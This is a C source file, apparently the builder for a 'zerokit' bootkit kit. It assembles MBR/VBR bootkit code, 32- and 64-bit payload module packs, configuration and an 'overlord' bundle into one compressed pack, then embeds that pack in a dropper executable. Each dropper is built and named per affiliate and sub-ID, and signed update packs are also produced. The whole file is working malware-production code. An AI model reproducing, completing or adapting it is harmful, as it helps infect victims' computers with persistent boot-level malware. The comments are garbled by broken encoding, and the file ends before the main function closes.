#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../../../shared_code/platform.h"
#include "../../../shared_code/types.h"
#include "../../../shared_code/native.h"
#include "../../../shared_code/crc64.h"
#include "../../../shared_code/utils.h"
#include "../../../shared_code/config.h"
#include "../../../shared_code/lzma.h"

#define USE_LZMA_COMPRESSOR 1
#include "../../../shared_code/lzma.c"

#include "../../../loader/mod_shared/zerokit.h"

#define BUILDER_VERSION "1.0.6"

#define SET_COMPILER_ENV_BAT "set_compiler_env.bat"

// �������������� ��� ������ ���������:
// 1. ��������� ��������.
// 2. ��������� ������.

typedef struct cmd_options
{
    uint32_t sid;           // ������������� �������.
    uint32_t affId;         // �����.
    uint32_t subId;         // �����.
    char* zerokitVersion;   // ���� � ����������������� ����� ��� ����.
    char* dropperPath;      // ���� � ������ ����� ��� ���������������� ����.
    char* buildParams;      // ���� � ������ ����� ��� ���������������� ����.
    char* bootkitPath;      // ���� � ������ �������.
    char* bundlePath;       // ���� � overlord-������.
    uint32_t mode;          // ����� ������ �������� (1 - ������ ��� ��������, 2 - ��������� ������).
    uint32_t date;          // ��������� ���� ��� ��������� ��� �������.
    char* zones;            // ������ ���, ���������� ������ � �������.
    char* ntpServers;       // ������ NTP-�������� ���������� ������ � �������.
    int noisy;              // ������� ��������� �������� �������� ��������� ����������. ����� ���� ��������� ������ ����� ������.
    int temp;               // ������� ��������� �������� ��������� ��������� �����.
    int lite;               // ���� ������ ���� ����������, �� ����� ���������� lite-������ ��������.
} cmd_options_t, *pcmd_options_t;

cmd_options_t gCmdOptions;

cmd_line_info_t cmdLineInfo = {15,
{
    {{"i", "sid"}, "ServerId for generate zerokit pack", "Specify integer value for sid", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.sid},
    {{"a", "affid"}, "AffId for generate zerokit pack", "Specify integer value for affid", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.affId},
    {{"s", "subid"}, "SubId for generate zerokit pack", "Specify integer value for subid", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.subId},
    {{"v", "zkver"}, "Version of zerokit", "Specify correct the correct version of zerokit or '.' for use last available version", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.zerokitVersion},
    {{"d" , "dropper"}, "Path to dropper sources", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.dropperPath},
    {{"p" , "params"}, "Build parameters for dropper", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.buildParams},
    {{"b" , "bootkit"}, "Path to bootkit files", "", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.bootkitPath},
    {{"o" , "overlord"}, "Path to overlord files", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.bundlePath},
    {{"m" , "mode"}, "Mode: 1 = Dropper, 2 = Bundle", "", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.mode},
    {{"u", "date"}, "Start date in UnixTime format (UTC+0)", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.date},
    {{"z", "zones"}, "List of zones for domains", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.zones},
    {{"x", "ntplist"}, "List of NTP-servers", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.ntpServers},
    {{"n", "noisy"}, "Noisy mode", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_BOOLEAN, (void*)&gCmdOptions.noisy},
    {{"t", "temp"}, "Save temporary files", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_BOOLEAN, (void*)&gCmdOptions.temp},
    {{"l", "lite"}, "Build lite version of dropper", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_BOOLEAN, (void*)&gCmdOptions.lite},
}
};

#define ZEROKIT_CONF 0
#define HANDLER_ZK_BIND_CONF 1
#define KEY_PRIVATE 2
#define KEY_PUBLIC 3
#define FILE_COUNT 3

#define NOISY_PRINTF(x) if (gCmdOptions.noisy) printf x;
#define QUIET_PRINTF(x) if (!gCmdOptions.noisy) printf x;


//////////////// fasm symbols

#pragma pack(push, 1)

typedef struct _fsym_header
{
    uint32_t sig;
    uint8_t fasmMajorVer;
    uint8_t fasmMinorVer;
    uint16_t hdrLength;
    uint32_t inFileOffset;
    uint32_t outFileOffset;
    uint32_t strTableOffset;
    uint32_t strTableLength;
    uint32_t symTableOffset;
    uint32_t symTableLength;
    uint32_t ppSourceOffset;
    uint32_t ppSourceLength;
    uint32_t asmDumpOffset;
    uint32_t asmDumpLength;
    uint32_t namesSectOffset;
    uint32_t namesSectLength;
    uint32_t symRefsOffset;
    uint32_t symRefsLength;
} fsym_header_t;

typedef struct _fsymbol
{
    uint64_t symVal;
    uint16_t flags;
    uint8_t size;
    uint8_t type;
    uint32_t extendedSIB;
    uint16_t passNumberLastDefined;
    uint16_t passNumberLastUsed;
    uint32_t relatedSym;
    uint32_t relatedOffset;
    uint32_t ppOffset;
} fsymbol_t;

typedef struct _fpreprocessed
{
    uint32_t offset;
    uint32_t lineNum;
    uint32_t ownerLineNum;
    uint32_t ppMacroOffset;
    char tokens[1];
} fpreprocessed_t;

#pragma pack(pop)

//////////////// fasm symbols

int main(int argc, char** argv)
{
	int i, ret = EXIT_FAILURE;
    char* ptr;
    char rootPath[MAX_PATH];
    char sidPath[MAX_PATH];
    char affidPath[MAX_PATH];
    char subidPath[MAX_PATH];
    char filePath[MAX_PATH];
    char filePath1[MAX_PATH];
    char outputPath[MAX_PATH];
    char modsSrcPath[MAX_PATH];
    char commandLine[1024];
    char tmp[32];
    WIN32_FIND_DATA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char* filePaths[FILE_COUNT];
    uint8_t* allInOne = NULL;
//    uint8_t* bkMBR = NULL;
    uint8_t* zbkBuffer = NULL;
    uint8_t* zbkSymsBuffer = NULL;
    uint8_t* pack32Buffer = NULL;
    uint8_t* pack64Buffer = NULL;
    uint8_t* bundleBuffer = NULL;
    uint8_t* confBuffer = NULL;
    uint32_t packSize;
    size_t pack32Size, pack64Size, zbkSize, zbkSymsSize, bkPayload32Size, bkPayload64Size, bundleSize = 0, confSize = 0;
    pzerokit_header_t pZerokitPack;
    uint8_t* outData = NULL;
    uint8_t zerokitVer = 0;
    pmods_pack_header_t pModsPackHeader;
    char* files[FILE_COUNT] = {"skey.public", "key.private", "key.public"};
    char* dropperParams[2] = {"", "/lite_ver"};
    char* dropperPrefixes[2] = {"dpc", "dpl"};
    char dropperVer[7], loaderVer[7];

    GetModuleFileName(NULL, rootPath, MAX_PATH);

    memset(&gCmdOptions, 0, sizeof(cmd_options_t));
    gCmdOptions.subId = -1;

    filePaths[0] = affidPath;
    filePaths[1] = filePaths[2] = filePaths[3] = sidPath;

    if (config_parse_cmdline(argc, argv, &cmdLineInfo, BUILDER_VERSION) != ERR_OK) {
        return EXIT_FAILURE;
    }

    if (gCmdOptions.mode == 1) {
        // ��������� ������������ ����������.

        if (gCmdOptions.dropperPath == NULL) {
            printf("Please specify dopper path\n");
            return EXIT_FAILURE;
        }

        if (gCmdOptions.date == 0) {
            printf("Please specify start date\n");
            return EXIT_FAILURE;
        }

        if (gCmdOptions.affId == 0) {
            printf("Please specify correct affid\n");
            return EXIT_FAILURE;
        }

        if (gCmdOptions.subId == -1) {
            printf("Please specify correct subid\n");
            return EXIT_FAILURE;
        }
    }

    NOISY_PRINTF(("\n--- builder ---\n\n"));

    NOISY_PRINTF(("Initializing... "));
    do {
        ptr = rootPath + strlen(rootPath);
        // �������� ���� \bin.
        for ( ; *ptr != '\\' && *ptr != '/'; --ptr);
        // �������� ������.
        *ptr = '\0';

        // ������ ������� ����������� ����, ������ �����������.
        if (utils_set_current_directory(rootPath) != ERR_OK) {
            NOISY_PRINTF(("Failed\n  ! Can't set current directory\n\n"));
            break;
        }

        ptr -=3;
        // �������� ���� �����, ���� ��� �� bin, �� ������ ����� ��� ��������� �� � ��� �����.
        if (_stricmp(ptr, "bin") != 0) {
            NOISY_PRINTF(("Failed\n  ! Path of builder is incorrect\n\n"));
            break;
        }

        *ptr = '\0';

        // ���������� ���� � ����� �������.
        utils_build_path(sidPath, rootPath, "sids\\", 0);
        _itoa(gCmdOptions.sid, tmp, 10);
        strcat_s(sidPath, MAX_PATH, tmp);
        strcat_s(sidPath, MAX_PATH, "\\");

        if (gCmdOptions.mode == 1) {
            // ���������� ���� � ����� ������ �������.
            strcpy_s(affidPath, MAX_PATH, sidPath);
            _itoa(gCmdOptions.affId, tmp, 10);
            strcat_s(affidPath, MAX_PATH, tmp);
            strcat_s(affidPath, MAX_PATH, "\\");

            // ���������� ���� � ����� ���� ��� ������.
            strcpy_s(subidPath, MAX_PATH, affidPath);
            _itoa(gCmdOptions.subId, tmp, 10);
            strcat_s(subidPath, MAX_PATH, tmp);
            strcat_s(subidPath, MAX_PATH, "\\");

            // ���������� ���� � ����� ��� ������������ �����.
            utils_build_path(outputPath, subidPath, "output\\", 0);
        }
        else if (gCmdOptions.mode == 2) {
            // ���������� ���� � ����� ��� ������������ �����.
            utils_build_path(outputPath, sidPath, "updates\\", 0);
        }

        // ���������� ���� � ����� ������ �����.
        utils_build_path(modsSrcPath, rootPath, "clean\\mods\\", 0);

        // ��������� ������ ��������, ���� ������ ���������� ������ ������� *, �� ���� � ������������������ ������� ����� ����� ��������� ������.
        if (strcmp(gCmdOptions.zerokitVersion, "*") == 0) {
            char searchDir[MAX_PATH];

            NOISY_PRINTF(("OK\nSearching for last version of zerokit... "));

            strcpy_s(searchDir, MAX_PATH, modsSrcPath);
            strcat_s(searchDir, MAX_PATH, "*");

            hFind = FindFirstFile(searchDir, &ffd);

            if (hFind == INVALID_HANDLE_VALUE) {
                NOISY_PRINTF(("Failed\n  ! Can't find any zerokit version\n\n"));
                break;
            }

            do {
                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    uint8_t ver;
                    char* dot;
                    if ((dot = strstr(ffd.cFileName, ".")) != NULL) {
                        *dot = 0;
                        ver = (((uint8_t)atoi(ffd.cFileName) & 0x0f) << 4) | ((uint8_t)atoi(dot + 1) & 0x0f);
                        if (ver > zerokitVer)
                            zerokitVer = ver;
                    }
                }
            } while (FindNextFile(hFind, &ffd) != 0);

            if (zerokitVer == 0) {
                NOISY_PRINTF(("Failed\n  ! Unknown zerokit version\n\n"));
                break;
            }

            // �������� ������������� ��� �����.
            sprintf_s(loaderVer, 7, "%u.%u", (zerokitVer >> 4) & 0x0f, zerokitVer & 0x0f);
            NOISY_PRINTF(("(%s) ", loaderVer));
        }
        else {
            strcpy_s(loaderVer, 7, gCmdOptions.zerokitVersion);
        }
        strcat_s(modsSrcPath, MAX_PATH, loaderVer);
        strcat_s(modsSrcPath, MAX_PATH, "\\");

        NOISY_PRINTF(("OK\nChecking directories... "));

        // ��������� ������������� ����� �������.
        if (utils_is_file_exists(sidPath) == ERR_BAD) {
            NOISY_PRINTF(("Failed\n  ! Can't find %s directory\n\n", sidPath));
            break;
        }

        if (gCmdOptions.mode == 1) {
            // ��������� ������������� ����� ������ �������.
            if (utils_is_file_exists(affidPath) == ERR_BAD) {
                NOISY_PRINTF(("Failed\n  ! Can't find %s directory\n\n", affidPath));
                break;
            }
        }

        // ��������� ������������� ����� � ������������ ������.
        if (utils_is_file_exists(modsSrcPath) == ERR_BAD) {
            NOISY_PRINTF(("Failed\n  ! Can't find %s directory\n\n", modsSrcPath));
            break;
        }

        NOISY_PRINTF(("OK\nCreating necessary directories... "));

        if (gCmdOptions.mode == 1) {
            // ������ ����� ���� � ����� ������ �������, ���� ��� �� ����������.
            if (utils_is_file_exists(subidPath) == ERR_BAD) {
                if (utils_create_directory(subidPath) != ERR_OK) {
                    NOISY_PRINTF(("Failed\n  ! Can't create %s\n\n", subidPath));
                }
            }
        }

        // ������ �����, ��� ����� ������ ������������ ����, ���� � �� ����������.
        if (utils_is_file_exists(outputPath) == ERR_BAD) {
            if (utils_create_directory(outputPath) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Can't create %s\n\n", outputPath));
            }
        }

        // ����, ���� ����� ����������� ����.
        strcat_s(outputPath, MAX_PATH, loaderVer);
        strcat_s(outputPath, MAX_PATH, "\\");

        // ������ �����, ���� ��� �� ����������.
        if (utils_is_file_exists(outputPath) == ERR_BAD) {
            if (utils_create_directory(outputPath) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Can't create %s\n\n", outputPath));
            }
        }

        // ��������� ������������� ������ ��� ����� ������.
        for (i = (gCmdOptions.mode == 1 ? 0 : 2); i < FILE_COUNT; ++i) {
            utils_build_path(filePath, filePaths[i], files[i], 0);

            NOISY_PRINTF(("OK\nChecking %s... ", filePath));
            if (utils_is_file_exists(filePath) == ERR_BAD) {
                NOISY_PRINTF(("Failed\n  ! Not found\n\n", filePath));
                break;
            }
        }

        NOISY_PRINTF(("OK\nCopying clean mods... "));

        // �������� ������������ ����� ����� � �������������� ����� ��� �� ���������� ���������.
        strcat(modsSrcPath, "*");
        hFind = FindFirstFile(modsSrcPath, &ffd);
        modsSrcPath[strlen(modsSrcPath) - 1] = '\0';

        if (hFind ==  INVALID_HANDLE_VALUE) {
            NOISY_PRINTF(("Failed\n  ! Can't find any mod file\n\n"));
            break;
        }

        i = 0;
        do {
            if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
                char srcFile[MAX_PATH];
                char destFile[MAX_PATH];

                strcpy(srcFile, modsSrcPath);
                strcat(srcFile, ffd.cFileName);

                strcpy(destFile, outputPath);
                strcat(destFile, ffd.cFileName);
                if (utils_copy_file(srcFile, destFile) != ERR_OK) {
                    i = 1;
                    NOISY_PRINTF(("Failed\n  ! Can't copy from %s to %s\n\n", srcFile, destFile));
                    break;
                }
            }
        } while (FindNextFile(hFind, &ffd) != 0);

        // ���� �����-�� �� ����� �� �������������, �� ��������� ������.
        if (i == 1) {
            break;
        }

        outputPath[strlen(outputPath) - 1] = '\0';

        if (gCmdOptions.mode == 1) {
            // ���������� �������, ������� ����� �������������� ��� ����������� ������� � mod_config.
            sprintf_s(commandLine, 1024, "zkpatcher.exe -i=%u -a=%u -s=%u -m=\"%s\" -o=\"%s\" -d=%u -z=\"%s\" -t=\"%s\"",
                gCmdOptions.sid, gCmdOptions.affId, gCmdOptions.subId, outputPath, outputPath, gCmdOptions.date, gCmdOptions.zones, gCmdOptions.ntpServers);
            if (gCmdOptions.noisy) {
                strcat_s(commandLine, 1024, " -n");
            }

            NOISY_PRINTF(("OK\n\nCommand: %s\n", commandLine));

            // ��������� �������.
            if (!utils_launch_and_verify(commandLine, NULL)) {
                NOISY_PRINTF(("Failed\n  ! Failed to launch zkpatcher\n\n"));
                break;
            }
        }

        // ���������� �������, ������� ����� �������� ���� � ���� ��� �� �����������, �. �. � ����� ������� ��� �����: pack32.bin, pack64.bin.
        sprintf_s(commandLine, 1024, "modsjoiner.exe -m=\"%s\" -o=\"%s\"", outputPath, outputPath);
        if (gCmdOptions.noisy) {
            strcat_s(commandLine, 1024, " -n");
        }

        NOISY_PRINTF(("\nCommand: %s\n", commandLine));

        // ��������� �������.
        if (!utils_launch_and_verify(commandLine, NULL)) {
            NOISY_PRINTF(("Failed\n  ! Failed to launch modsjoiner\n\n"));
            break;
        }

        // ��������� 32-������ ���.
        NOISY_PRINTF(("Reading pack32.bin... "));
        utils_build_path(filePath, outputPath, "pack32.bin", 0);
        if (utils_read_file(filePath, &pack32Buffer, &pack32Size) != ERR_OK) {
            NOISY_PRINTF(("Failed\n  ! Cant't read file\n\n"));
            break;
        }

        // ��������� 64-������ ���.
        NOISY_PRINTF(("OK\nReading pack64.bin... "));
        utils_build_path(filePath, outputPath, "pack64.bin", 0);
        if (utils_read_file(filePath, &pack64Buffer, &pack64Size) != ERR_OK) {
            NOISY_PRINTF(("Failed\n  ! Cant't read file\n\n"));
            break;
        }

        if (gCmdOptions.mode == 1) {
            // ��������� ���������������� ����.
            NOISY_PRINTF(("OK\nReading configuration.z... "));
            utils_build_path(filePath, outputPath, "configuration.z", 0);
            if (utils_read_file(filePath, &confBuffer, &confSize) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Cant't read file\n\n"));
                break;
            }

            // ������ ������� ����������� ����� � ������� ���������.
            if (gCmdOptions.bundlePath == NULL || utils_set_current_directory(gCmdOptions.bundlePath) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Can't change directory to overlord's bundle location\n\n"));
                break;
            }

            NOISY_PRINTF(("OK\nCopying overlord's conf.z... "));
            // �������� ���������������� ���� ���������.
            utils_build_path(filePath, sidPath, "overlord\\conf.z", 0);
            //utils_build_path(filePath1, gCmdOptions.bundlePath, "conf.z", 0);
            if (utils_copy_file(filePath, "conf.z"/*filePath1*/) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Can't copy %s to %s\n\n", filePath, filePath1));
                break;
            }

            utils_build_path(filePath, sidPath, "key.private", 0);
            // ���������� �������, ������� ������� ������ ������ �� ������ ���������.
            sprintf_s(commandLine, MAX_PATH, "cmd.exe /C \"make_bundle.bat /key \"%s\"\"", filePath);

            NOISY_PRINTF(("\nCommand: %s\n", commandLine));

            // ��������� �������.
            if (!utils_launch_and_verify(commandLine, NULL)) {
                NOISY_PRINTF(("Failed\n  ! Failed to launch overlord's bundle maker script\n\n"));
                goto exit;
            }

            utils_build_path(filePath1, outputPath, "overlord.zzz", 0);

            // �������� ������� � ������������� �����.
            if (utils_copy_file("overlord.zzz", filePath1) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Can't copy from %s to %s\n\n", "overlord.zzz", filePath1));
                goto exit;
            }

            // ������ ������� ����������� ����� ������ ������� ������ ������.
            //utils_set_current_directory(rootPath);
            utils_build_path(filePath, rootPath, "bin", 0);
            utils_set_current_directory(filePath);

            // ��������� �����.
            NOISY_PRINTF(("OK\nReading overlord.zzz... "));
            if (utils_read_file(filePath1, &bundleBuffer, &bundleSize) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Cant't read file\n\n"));
                break;
            }
        }

        NOISY_PRINTF(("OK\nChecking bootkit directory... "));
        if (utils_is_file_exists(gCmdOptions.bootkitPath) == ERR_BAD) {
            NOISY_PRINTF(("Failed\n  ! Can't find %s directory\n\n", gCmdOptions.bootkitPath));
            break;
        }
        
        NOISY_PRINTF(("OK\nReading complete.bin... "));
        utils_build_path(filePath, gCmdOptions.bootkitPath, "complete.bin", 0);
        if (utils_read_file(filePath, &zbkBuffer, &zbkSize) != ERR_OK) {
            NOISY_PRINTF(("Failed\n  ! Cant't read complete.bin\n\n"));
            break;
        }

        zbkBuffer = realloc(zbkBuffer, zbkSize + 2);

        NOISY_PRINTF(("OK\nReading complete.sym... "));
        utils_build_path(filePath, gCmdOptions.bootkitPath, "complete.sym", 0);
        if (utils_read_file(filePath, &zbkSymsBuffer, &zbkSymsSize) != ERR_OK) {
            NOISY_PRINTF(("Failed\n  ! Cant't read complete.sym\n\n"));
            break;
        }

        // ���� �������� �� ������� ����� ����������, ������� ����� ������� ������� ����� ��� ����������.
        {
            fsym_header_t* pSymsHdr = (fsym_header_t*)zbkSymsBuffer;
            fsymbol_t* pSym = (fsymbol_t*)(zbkSymsBuffer + pSymsHdr->symTableOffset);
            int i;
            bool_t found = FALSE;

            NOISY_PRINTF(("OK\nSearching for key offset in complete.bin... "));
            for (i = 0; i< pSymsHdr->symTableLength; ++i, ++pSym) {
                fpreprocessed_t* pPP = (fpreprocessed_t*)(zbkSymsBuffer + pSymsHdr->ppSourceOffset + pSym->ppOffset);
                if (strcmp(pPP->tokens + 2, "l_decryptor:") == 0) {
                    found = TRUE;
                    *(uint16_t*)(zbkBuffer + zbkSize) = (uint16_t)pSym->symVal;
                    zbkSize += 2;
                    NOISY_PRINTF(("OK\n"));
                    break;
                }   
            }

            // ����������� ����� � ���������� ����������� ��� �������.
            free(zbkSymsBuffer);

            if (!found) {
                NOISY_PRINTF(("Failed\n  ! Can't found encryption key offset\n\n"));
                break;
            }
        }

        utils_build_path(filePath, gCmdOptions.bootkitPath, "payload_x32.bin", 0);
        bkPayload32Size = (uint32_t)utils_get_file_size(filePath);

        utils_build_path(filePath, gCmdOptions.bootkitPath, "payload_x64.bin", 0);
        bkPayload64Size = (uint32_t)utils_get_file_size(filePath);

        NOISY_PRINTF(("OK\nMerging all components... "));
        // ��������� ������ �������������� ���� (��������� ��������, ������, 32-������ ���, 64-������ ���, ���. ����� � ����� ����).
        packSize = zbkSize + pack32Size + pack64Size + confSize + bundleSize;
        allInOne = malloc(packSize);
        if (allInOne == NULL) {
            NOISY_PRINTF(("Failed\n  ! Can't allocate memory for merged pack\n\n"));
            break;
        }

        // �������� ������������� ��� ��������.
        memcpy(allInOne, zbkBuffer, zbkSize); // ����� ���� �������.
        memcpy(allInOne + zbkSize, pack32Buffer, pack32Size); // ����� 32-������ ��� ����� ����� �� ��������.
        memcpy(allInOne + zbkSize + pack32Size, pack64Buffer, pack64Size); // ����� 64-������ ��� ����� ����� �� 32-������ �����.
        if (gCmdOptions.mode == 1) {
            memcpy(allInOne + zbkSize + pack32Size + pack64Size, confBuffer, confSize); // ����� ������������ ����� �� 64-������ �����.
            memcpy(allInOne + zbkSize + pack32Size + pack64Size + confSize, bundleBuffer, bundleSize); // ����� ����� ����� �� ��������.
        }

        // ��������� �������� �� ������� � ���������� ��� ����� ������ ��������.
        // x32 header.
        pModsPackHeader = (pmods_pack_header_t)(allInOne + zbkSize);
        pModsPackHeader->bkBaseDiff = (uint8_t*)pModsPackHeader - allInOne;
        // x64 header.
        pModsPackHeader = (pmods_pack_header_t)((uint8_t*)pModsPackHeader + pack32Size);
        pModsPackHeader->bkBaseDiff = (uint8_t*)pModsPackHeader - allInOne;

        pZerokitPack = (pzerokit_header_t)(allInOne + 1024 + 2);
        pZerokitPack->sizeOfBootkit = zbkSize; // MBR/VBR + ���� �������.
        pZerokitPack->sizeOfBkPayload32 = bkPayload32Size;
        pZerokitPack->sizeOfBkPayload64 = bkPayload64Size;
        pZerokitPack->sizeOfBundle = bundleSize;
        pZerokitPack->sizeOfPack = packSize;
        pZerokitPack->sizeOfConfig = confSize;

        // ��������� ������������ ���.
        utils_build_path(filePath, outputPath, "orig_pack.bin", 0);
        NOISY_PRINTF(("OK\nSaving original pack to %s... ", filePath));
        utils_save_file(filePath, allInOne, packSize);

        // ���������� ���� � �������������� ����.
        utils_build_path(filePath, outputPath, "pack.bin", 0);

        if (gCmdOptions.mode == 1) {
            CLzmaEncProps props;
            size_t outSize;
            unsigned propsSize = LZMA_PROPS_SIZE;

            NOISY_PRINTF(("OK\nSaving compressed pack to %s... ", filePath));

            LzmaEncProps_Init(&props);
            props.dictSize = 1048576; // 1 MB
            outSize = packSize + packSize / 3 + 128 - LZMA_PROPS_SIZE;
            outData = malloc(outSize);

            if (LzmaEncode(&outData[LZMA_PROPS_SIZE], &outSize, allInOne, packSize, &props, outData, &propsSize) != 0) {
                break;
            }

            packSize = outSize + propsSize;

            // ��������� ������������� ���.
            if (utils_save_file(filePath, outData, packSize) != 0) {
                NOISY_PRINTF(("Failed\n  ! Can't save %s\n\n", filePath));
                break;
            }

            NOISY_PRINTF(("OK\n"));
        }

        if (gCmdOptions.mode == 1 && gCmdOptions.dropperPath != NULL) {
            char dropperPath[MAX_PATH];

            // ���������� ���� � ����� ���������, ���� ����� ������� C-������ �������-����.
            strcpy_s(filePath, MAX_PATH, gCmdOptions.dropperPath);

            utils_build_path(dropperPath, filePath, "code\\payloadData.h", 0);

            // ������� ����.
            utils_remove(dropperPath);

            // ���������� ������� ��� ��������������� ��������� ����� � C-������.
            utils_build_path(filePath1, outputPath, "pack.bin", 0);
            sprintf_s(commandLine, 1024, "python.exe bin2hex.py %s %s", filePath1, dropperPath);

            NOISY_PRINTF(("\nCommand: %s\n", commandLine));

            // ��������� �������.
            if (!utils_launch_and_verify(commandLine, NULL)) {
                NOISY_PRINTF(("Failed\n  ! Failed to launch bin2hex.py script\n\n"));
                break;
            }

            // ������ ������ �������� �� ����� version.h
            utils_build_path(dropperPath, filePath, "code\\version.h", 0);

            {
                char* verData;
                char* pVer;
                char* pVerBeg;
                size_t verDataSize;

                if (utils_read_file(dropperPath, (uint8_t**)&verData, &verDataSize) != ERR_OK) {
                    NOISY_PRINTF(("Failed\n  ! Can't read %s\n\n", dropperPath));
                    break;
                }

                pVer = verData;
                if ((pVer = strstr(pVer, "AUTOBUILD_VER")) == NULL) {
                    NOISY_PRINTF(("Failed\n  ! AUTOBUILD_VER not found in %s\n\n", dropperPath));
                    break;
                }
                pVer += strlen("AUTOBUILD_VER");

                for ( ; *pVer != '\0' && *pVer != '\n' && *pVer != '"'; ++pVer);

                if (*pVer != '"') {
                    NOISY_PRINTF(("Failed\n  ! Version string not found in %s\n\n", dropperPath));
                    break;
                }

                pVerBeg = ++pVer;

                for ( ; *pVer != '\0' && *pVer != '\n' && *pVer != '"'; ++pVer);

                if (*pVer != '"') {
                    NOISY_PRINTF(("Failed\n  ! Incorrect version string in %s\n\n", dropperPath));
                    break;
                }

                *pVer = '\0';

                strcpy_s(dropperVer, 7, pVerBeg);
                free(verData);
            }

            // ������ ������� ����������� ����� � ���������.
            if (utils_set_current_directory(filePath) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Can't change directory to dropper location\n\n"));
                break;
            }
            
//            for (i = 0; i < 2; ++i) {
            // ���������� �������, ������� ������� ���� complete-��������.
            if (gCmdOptions.buildParams != NULL) {
                // ��������� ��������� ����� ��� ��������, ���� ��� �������.
                sprintf_s(commandLine, MAX_PATH, "cmd.exe /C \"build.bat %s %s /aff_id %u /sub_id %u\"", gCmdOptions.buildParams, dropperParams[gCmdOptions.lite], gCmdOptions.affId, gCmdOptions.subId);
            }
            else {
                sprintf_s(commandLine, MAX_PATH, "cmd.exe /C \"build.bat %s /aff_id %u /sub_id %u\"", dropperParams[gCmdOptions.lite], gCmdOptions.affId, gCmdOptions.subId);
            }

            NOISY_PRINTF(("\nCommand: %s\n", commandLine));

            // ��������� �������.
            if (!utils_launch_and_verify(commandLine, NULL)) {
                NOISY_PRINTF(("Failed\n  ! Failed to launch dropper's build.bat script\n\n"));
                goto exit;
            }

            // ���������� ���� ���������� ����� ��������.
            sprintf_s(filePath1, MAX_PATH, "%s\\%s_%u_%u_%s_%s.ex_", outputPath, dropperPrefixes[gCmdOptions.lite], gCmdOptions.affId, gCmdOptions.subId, dropperVer, loaderVer);
//                 utils_build_path(filePath, modsCompletePath, "dropper.exe", 1);
//                 strcpy_s(modsCompletePath, MAX_PATH, filePath);

            utils_build_path(dropperPath, filePath, "autobuild\\dropper.exe", 0);

            // �������� ������� � ������������� �����.
            if (utils_copy_file(dropperPath, filePath1) != ERR_OK) {
                NOISY_PRINTF(("Failed\n  ! Can't copy from %s to %s\n\n", dropperPath, filePath1));
                goto exit;
            }

            QUIET_PRINTF(("ok:%s\n", filePath1));
//            }

            // ������ ������� ����������� ����� ������ ������� ������ ������.
            utils_build_path(filePath, rootPath, "bin", 0);
            utils_set_current_directory(filePath);
        }
        else if (gCmdOptions.mode == 2) {
            utils_build_path(filePath, outputPath, "orig_pack.bin", 0);
            utils_build_path(filePath1, sidPath, "key.private", 0);
            sprintf_s(commandLine, MAX_PATH, "zpacker.exe -f=\"%s*update.z**0\" -i=%u -k=\"%s\" -o=\"%s\" -n=\"incarnation\" -u=0", filePath, gCmdOptions.sid, filePath1, outputPath);
            NOISY_PRINTF(("\nCommand: %s\n", commandLine));

            // ��������� �������.
            if (!utils_launch_and_verify(commandLine, NULL)) {
                NOISY_PRINTF(("Failed\n  ! Failed to launch dropper's build.bat script\n\n"));
                goto exit;
            }
        }

        if (!gCmdOptions.temp) {
            // ������� ����� mod-��.
            NOISY_PRINTF(("Deleting temporary files... "));

            utils_build_path(filePath1, outputPath, "*.sy?", 0);
            hFind = FindFirstFile(filePath1, &ffd);
            
            if (hFind == INVALID_HANDLE_VALUE) {
                NOISY_PRINTF(("Failed\n  ! Can't find any mod file\n\n"));
                break;
            }

            i = 0;
            do {
                if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
                    utils_build_path(filePath, outputPath, ffd.cFileName, 0);
                    utils_remove(filePath);
                }
            } while (FindNextFile(hFind, &ffd) != 0);

            // ������� ���� �� ������� ����.
            utils_build_path(filePath, outputPath, "orig_pack.bin", 0);
            utils_remove(filePath);

            // ������� ���� 32-������� ����.
            utils_build_path(filePath, outputPath, "pack32.bin", 0);
            utils_remove(filePath);

            // ������� ���� 64-������� ����.
            utils_build_path(filePath, outputPath, "pack64.bin", 0);
            utils_remove(filePath);

            if (gCmdOptions.mode == 1) {
                // ������� ���� ����.
                utils_build_path(filePath, outputPath, "pack.bin", 0);
                utils_remove(filePath);
                // ������� ���� ������������.
                utils_build_path(filePath, outputPath, "configuration.z", 0);
                utils_remove(filePath);
                // ������� ���� ������.
                utils_build_path(filePath, outputPath, "overlord.zzz", 0);
                utils_remove(filePath);
            }

            NOISY_PRINTF(("OK\n"));
        }

        ret = EXIT_SUCCESS;
    } while (0);
exit:
    NOISY_PRINTF(("\n--- builder ---\n\n"));

    if (ret == EXIT_FAILURE) {
        QUIET_PRINTF(("failed\n"));
    }

